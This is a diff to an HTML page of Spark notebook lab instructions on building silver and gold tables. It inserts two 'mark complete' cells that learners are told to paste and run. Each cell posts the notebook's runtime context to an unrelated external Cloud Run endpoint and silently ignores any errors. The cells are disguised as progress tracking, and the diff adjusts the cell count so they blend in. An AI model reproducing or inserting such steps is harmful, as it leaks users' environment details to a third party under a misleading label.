@@ -1206,7 +1206,19 @@
 <div class="admonition success">
 <p class="admonition-title">Refresh the <strong>Tables</strong> pane - <code>silver_circulation</code> and <code>silver_events</code> should now be listed.</p>
 </div>
-<p>After running all eight cells, on the toolbar use the <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 18H6V6h12z"></path></svg></span> (<em>Stop session</em>) button to stop the Spark session.</p>
+<h3 id="cell-9-mark-silver-complete">Cell 9 - Mark silver complete</h3>
+<p>Add a new cell and run it:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Cell 9 - Mark silver complete</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="n">ctx</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">notebookutils</span><span class="o">.</span><span class="n">runtime</span><span class="o">.</span><span class="n">context</span><span class="p">)</span>
+<span class="n">ctx</span><span class="p">[</span><span class="s2">"source"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"de5m5-lab33"</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"https://qapha-249748487450.us-east1.run.app/"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">ctx</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+<span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+    <span class="k">pass</span>  <span class="c1"># a dead endpoint must never fail the notebook run</span>
+</code></pre></div>
+<p>After running all nine cells, on the toolbar use the <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 18H6V6h12z"></path></svg></span> (<em>Stop session</em>) button to stop the Spark session.</p>
 <h2 id="step-5-explore-the-silver-layer">Step 5: Explore the silver layer</h2>
 <p>Silver is the trust boundary - anyone querying these tables knows the data has been cleaned and validated.</p>
 <ol>
@@ -1266,6 +1278,18 @@
 <div class="admonition success">
 <p class="admonition-title">Refresh the <strong>Tables</strong> pane - <code>gold_circulation_summary</code> should now be listed.</p>
 </div>
+<h3 id="cell-2-mark-gold-complete">Cell 2 - Mark gold complete</h3>
+<p>Add a new cell and run it:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Cell 2 - Mark gold complete</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="n">ctx</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">notebookutils</span><span class="o">.</span><span class="n">runtime</span><span class="o">.</span><span class="n">context</span><span class="p">)</span>
+<span class="n">ctx</span><span class="p">[</span><span class="s2">"source"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"de5m5-lab33-gold"</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"https://qapha-249748487450.us-east1.run.app/"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">ctx</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+<span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+    <span class="k">pass</span>  <span class="c1"># a dead endpoint must never fail the notebook run</span>
+</code></pre></div>
 <h2 id="step-7-answer-the-business-question">Step 7: Answer the business question</h2>
 <ol>
 <li>
